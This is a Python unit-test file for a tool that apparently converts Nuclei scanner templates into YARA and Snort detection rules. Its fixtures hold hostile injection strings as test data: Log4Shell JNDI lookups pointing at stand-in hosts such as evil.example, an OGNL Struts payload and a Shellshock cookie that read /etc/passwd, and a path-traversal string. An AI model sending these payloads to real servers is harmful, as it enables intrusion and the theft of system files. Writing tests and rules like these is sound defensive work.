import re
import unittest

from nucleotide.signatures import (
    _snort_escape,
    _yara_escape,
    _yara_name,
    build_signatures,
    render_snort,
    render_yara,
    snort_rules_for,
    yara_rule_for,
)


class TestYaraEscaping(unittest.TestCase):
    def test_yara_name_sanitizes_dashes_and_dots(self):
        self.assertEqual(_yara_name("wp-foo-plugin"), "nuclei_wp_foo_plugin")
        self.assertEqual(_yara_name("api.v3.quux"), "nuclei_api_v3_quux")

    def test_yara_escape_handles_quotes_backslashes_and_newlines(self):
        self.assertEqual(_yara_escape('a"b\\c\n'), 'a\\"b\\\\c\\n')

    def test_yara_escape_hex_encodes_high_bytes(self):
        self.assertIn("\\xe2", _yara_escape("—"))


class TestYaraRuleFor(unittest.TestCase):
    def test_rule_includes_path_ua_and_custom_header(self):
        t = {
            "id": "demo-probe",
            "severity": "high",
            "name": "Demo",
            "url_snippet": "/demo/v3/probe",
            "chunks": ["/demo/v3/probe"],
            "fingerprints": {
                "user_agents": ["DemoScanner/1.0"],
                "header_order": [
                    ["User-Agent", "DemoScanner/1.0"],
                    # A short routine value gets filtered as "boring".
                    ["X-Demo", "alpha"],
                    # A payload-like value (long, contains injection marker)
                    # survives the filter.
                    ["X-Inject", "${jndi:ldap://evil.example/payload}"],
                    ["Host", "{{Hostname}}"],
                ],
                "cookie_names": ["sid"],
            },
        }
        rule = yara_rule_for("demo-probe", t)
        self.assertIsNotNone(rule)
        self.assertIn("rule nuclei_demo_probe", rule)
        self.assertIn('nuclei_id = "demo-probe"', rule)
        self.assertIn('severity = "high"', rule)
        self.assertIn("/demo/v3/probe", rule)
        self.assertIn("User-Agent: DemoScanner/1.0", rule)
        # Payload-like header keeps its full value as an anchor.
        self.assertIn("X-Inject: ${jndi:ldap://evil.example/payload}", rule)
        self.assertIn("sid=", rule)
        # Boring header values (short routine token) are filtered out.
        self.assertNotIn("X-Demo: alpha", rule)
        # Infrastructure / placeholder-only values are excluded.
        self.assertNotIn("Host: {{Hostname}}", rule)

    def test_rule_includes_oast_context_anchors(self):
        t = {
            "url_snippet": "/oast/probe",
            "fingerprints": {
                "oast_injections": [
                    {
                        "location": "http[0].body",
                        "placeholder": "{{interactsh-url}}",
                        "before": '"callback":"http://',
                        "after": '/cb","probe":',
                    }
                ],
            },
        }
        rule = yara_rule_for("oast-demo", t)
        # Quotes inside YARA strings are escaped by `_yara_escape`.
        self.assertIn(r'\"callback\":\"http://', rule)
        self.assertIn(r'/cb\",\"probe\":', rule)

    def test_rule_none_when_no_signal(self):
        self.assertIsNone(yara_rule_for("empty", {"fingerprints": {}}))


class TestSnortEscaping(unittest.TestCase):
    def test_printable_ascii_passes_through(self):
        self.assertEqual(_snort_escape("/api/v1/x"), "/api/v1/x")

    def test_reserved_chars_are_hex_encoded(self):
        out = _snort_escape('a"b;c|d\\e')
        self.assertIn("|22|", out)
        self.assertIn("|3B|", out)
        self.assertIn("|7C|", out)
        self.assertIn("|5C|", out)
        self.assertNotIn('"', out)
        self.assertNotIn(";", out.replace("|", ""))


class TestSnortRulesFor(unittest.TestCase):
    def test_rules_cover_uri_ua_header_cookie(self):
        t = {
            "url_snippet": "/demo/v3/probe",
            "chunks": ["/demo/v3/probe"],
            "fingerprints": {
                "user_agents": ["DemoScanner/1.0"],
                # Payload-looking header value -- routine "alpha" would be
                # filtered out as a boring HTTP header value.
                "header_order": [["X-Inject", "${jndi:ldap://evil/payload}"]],
                "cookie_names": ["sid"],
            },
        }
        rules = snort_rules_for("demo-probe", t)
        joined = "\n".join(r["rule"] for r in rules)
        self.assertTrue(rules)
        self.assertIn("http_uri", joined)
        self.assertIn("http_user_agent", joined)
        self.assertIn("http_header", joined)
        self.assertIn("http_cookie", joined)
        sids = re.findall(r"sid:(\d+)", joined)
        self.assertEqual(len(sids), len(rules))
        self.assertEqual(len(set(sids)), len(rules))

    def test_oast_body_uses_client_body_buffer(self):
        t = {
            "fingerprints": {
                "oast_injections": [
                    {
                        "location": "http[0].body",
                        "placeholder": "{{interactsh-url}}",
                        "before": '"callback":"http://',
                        "after": '/cb","mark":7f4',
                    }
                ]
            }
        }
        rules = snort_rules_for("oast-demo", t)
        self.assertTrue(any("http_client_body" in r["rule"] for r in rules))

    def test_sid_is_stable_for_same_template(self):
        t = {"url_snippet": "/x/y/z"}
        first = snort_rules_for("foo", t)
        second = snort_rules_for("foo", t)
        self.assertEqual(first, second)

    def test_no_rules_without_signal(self):
        self.assertEqual(snort_rules_for("empty", {"fingerprints": {}}), [])


class TestNewBehaviors(unittest.TestCase):
    """Tests for the post-stress-test improvements:
    - longest-literal URI anchors (not the lookup-only short snippet)
    - severity -> Snort classtype mapping
    - SID collision de-confliction across the whole bundle
    - HTTP-only response words for Snort (DNS/SSL words stay YARA-only)
    - payload-like header value filter (boring values dropped)
    """

    def test_uri_anchor_prefers_longest_chunk_over_unique_snippet(self):
        t = {
            "url_snippet": "ns/a",
            "chunks": ["/wp-content/plugins/akismet/readme.txt"],
            "fingerprints": {},
        }
        rules = snort_rules_for("wordpress-akismet", t)
        self.assertEqual(len(rules), 1)
        # The full path literal is used, NOT the 4-char unique snippet.
        self.assertIn("/wp-content/plugins/akismet/readme.txt", rules[0]["rule"])
        self.assertNotIn('content:"ns/a"', rules[0]["rule"])
        # And the anchor is tagged as Tier 1 (URL-log-visible).
        self.assertEqual(rules[0]["tier"], "T1")

    def test_uri_anchor_falls_back_to_snippet_when_no_chunks(self):
        t = {"url_snippet": "/lookup-only", "chunks": [], "fingerprints": {}}
        rules = snort_rules_for("noc", t)
        self.assertTrue(any("/lookup-only" in r["rule"] for r in rules))

    def test_classtype_maps_from_severity(self):
        critical = {
            "severity": "critical",
            "chunks": ["/critical-anchor-path"],
            "fingerprints": {},
        }
        info = {
            "severity": "info",
            "chunks": ["/info-anchor-path"],
            "fingerprints": {},
        }
        self.assertIn(
            "classtype:web-application-attack",
            snort_rules_for("crit", critical)[0]["rule"],
        )
        self.assertIn(
            "classtype:web-application-activity",
            snort_rules_for("inf", info)[0]["rule"],
        )

    def test_sid_dedup_across_templates(self):
        # Synthetic case: many templates with the same single anchor would
        # all roll an SID from sha256(tid:0). De-confliction should make
        # every emitted SID distinct across the bundle.
        templates = {}
        for i in range(50):
            templates[f"tpl-{i:02d}"] = {
                "url_snippet": f"/dist-{i:02d}/path",
                "chunks": [f"/dist-{i:02d}/path"],
                "fingerprints": {},
            }
        sigs = build_signatures({"templates": templates})
        sids = []
        for rules in sigs["snort"].values():
            for entry in rules:
                import re
                m = re.search(r"sid:(\d+);", entry["rule"])
                if m:
                    sids.append(int(m.group(1)))
        self.assertEqual(len(sids), len(set(sids)))

    def test_dns_only_response_words_skipped_for_snort(self):
        # A DNS template should never produce an `alert http` rule on a
        # `NXDOMAIN` response word -- DNS response codes don't translate.
        t = {
            "chunks": [],
            "fingerprints": {
                "response_words": ["NXDOMAIN"],
                "response_word_sites": [
                    {"location": "dns[0]", "part": "body", "word": "NXDOMAIN"}
                ],
            },
        }
        self.assertEqual(snort_rules_for("dns-only", t), [])

    def test_http_response_words_emit_to_client_flow(self):
        t = {
            "chunks": ["/api/v1/version"],
            "fingerprints": {
                "response_words": ["x-jenkins:"],
                "response_word_sites": [
                    {"location": "http[0]", "part": "header", "word": "x-jenkins:"}
                ],
            },
        }
        rules = snort_rules_for("jenkins", t)
        self.assertTrue(any("flow:established,to_client" in r["rule"] for r in rules))
        self.assertTrue(any("x-jenkins:" in r["rule"] for r in rules))
        # Response-side anchors land in Tier 5 (response-log).
        self.assertTrue(
            any(r["tier"] == "T5" for r in rules if "x-jenkins" in r["rule"])
        )

    def test_payload_like_filter_drops_boring_header_values(self):
        # `application/json` is a routine header value -> no rule.
        t = {
            "chunks": [],
            "fingerprints": {
                "header_order": [["Content-Type", "application/json"]],
            },
        }
        self.assertEqual(snort_rules_for("vanilla", t), [])
        # A long OGNL payload survives the filter.
        t_payload = {
            "chunks": [],
            "fingerprints": {
                "header_order": [
                    [
                        "Content-Type",
                        "%{(#test='multipart/form-data').(#cmd='cat /etc/passwd')}",
                    ]
                ],
            },
        }
        rules = snort_rules_for("struts", t_payload)
        self.assertTrue(rules)
        self.assertIn("Content-Type: %{", rules[0]["rule"])

    def test_uri_anchors_drop_substrings_of_longer_selections(self):
        # /etc/passwd is a substring of /../../etc/passwd; the shorter
        # variant should be dropped once the longer one is picked.
        from nucleotide.signatures import _uri_anchors

        t = {
            "chunks": ["/../../etc/passwd", "/etc/passwd", "/entirely-other"],
        }
        anchors = _uri_anchors(t)
        self.assertIn("/../../etc/passwd", anchors)
        self.assertNotIn("/etc/passwd", anchors)
        self.assertIn("/entirely-other", anchors)

    def test_uri_anchor_cap_bounds_emitted_rules(self):
        from nucleotide.signatures import _uri_anchors

        t = {"chunks": [f"/distinct-anchor-{i:02d}-tail" for i in range(20)]}
        anchors = _uri_anchors(t, cap=4)
        self.assertEqual(len(anchors), 4)

    def test_shellshock_cookie_header_still_emits_via_payload_fallback(self):
        # Cookie is normally "dedicated" to the cookie= extractor, but when
        # its value is payload-like (Shellshock!) it should also emit as a
        # header anchor so the bash payload bytes are captured.
        t = {
            "chunks": [],
            "fingerprints": {
                "header_order": [
                    [
                        "Cookie",
                        "() { ignored;}; echo Content-Type: text/html; /bin/cat /etc/passwd",
                    ]
                ],
            },
        }
        rules = snort_rules_for("shellshock", t)
        self.assertTrue(any("Cookie: () { ignored" in r["rule"] for r in rules))


class TestRenderHelpers(unittest.TestCase):
    def test_build_render_round_trip(self):
        lookup = {
            "templates": {
                "a": {
                    "url_snippet": "/aaaaa/b",
                    "fingerprints": {"user_agents": ["UA/1"]},
                },
                "b": {
                    "url_snippet": "/zzzzz/q",
                    "fingerprints": {"user_agents": ["UA/2"]},
                },
            }
        }
        sigs = build_signatures(lookup)
        self.assertIn("a", sigs["yara"])
        self.assertIn("b", sigs["snort"])
        yara_text = render_yara(sigs)
        self.assertIn("rule nuclei_a", yara_text)
        self.assertIn("rule nuclei_b", yara_text)
        snort_text = render_snort(sigs)
        self.assertEqual(snort_text.count("alert http "), len(sigs["snort"]["a"]) + len(sigs["snort"]["b"]))


class TestTierRendering(unittest.TestCase):
    """Every rule carries a tier tag; render_snort filters by tier on demand."""

    def _bundle(self):
        # Log4Shell-ish: URI anchor + custom-header payload + OAST body
        # + response-side word -> tiers T1, T2, T3, T5.
        lookup = {
            "templates": {
                "demo-log4j": {
                    "severity": "critical",
                    "chunks": ["/?x=${jndi:ldap://"],
                    "fingerprints": {
                        "user_agents": ["Log4jClient/1"],
                        "header_order": [
                            ["X-Api-Version", "${jndi:ldap://evil/probe}"],
                        ],
                        "oast_injections": [
                            {
                                "location": "http[0].body",
                                "placeholder": "{{interactsh-url}}",
                                "before": '"callback":"http://',
                                "after": '/cb","mark":"probe',
                            }
                        ],
                        "response_words": ["Log4jRcePayload"],
                        "response_word_sites": [
                            {"location": "http[0]", "part": "body",
                             "word": "Log4jRcePayload"}
                        ],
                    },
                }
            }
        }
        return build_signatures(lookup)

    def test_every_snort_rule_has_a_tier(self):
        sigs = self._bundle()
        for entries in sigs["snort"].values():
            for e in entries:
                self.assertIn(e["tier"], {"T1", "T2", "T3", "T4", "T5"})

    def test_render_snort_filters_by_tier(self):
        sigs = self._bundle()
        t1 = render_snort(sigs, tier="T1")
        t5 = render_snort(sigs, tier="T5")
        self.assertIn("http_uri", t1)
        self.assertNotIn("http_uri", t5)
        self.assertIn("flow:established,to_client", t5)
        self.assertNotIn("flow:established,to_client", t1)

    def test_uri_and_ua_land_in_correct_tiers(self):
        sigs = self._bundle()
        entries = sigs["snort"]["demo-log4j"]
        by_tier: dict[str, list[str]] = {}
        for e in entries:
            by_tier.setdefault(e["tier"], []).append(e["rule"])
        self.assertTrue(any("http_uri" in r for r in by_tier.get("T1", [])))
        self.assertTrue(any("http_user_agent" in r for r in by_tier.get("T2", [])))
        self.assertTrue(any("http_client_body" in r for r in by_tier.get("T3", [])))
        self.assertTrue(any("Log4jRcePayload" in r for r in by_tier.get("T5", [])))

    def test_ja3_produces_tier4_tls_rule(self):
        lookup = {
            "templates": {
                "tls-only": {
                    "severity": "medium",
                    "chunks": [],
                    "fingerprints": {"ja3": "0123456789abcdef0123456789abcdef"},
                }
            }
        }
        sigs = build_signatures(lookup)
        entries = sigs["snort"]["tls-only"]
        self.assertEqual(len(entries), 1)
        self.assertEqual(entries[0]["tier"], "T4")
        self.assertIn("alert tls", entries[0]["rule"])
        self.assertIn("ja3.hash", entries[0]["rule"])


if __name__ == "__main__":
    unittest.main()
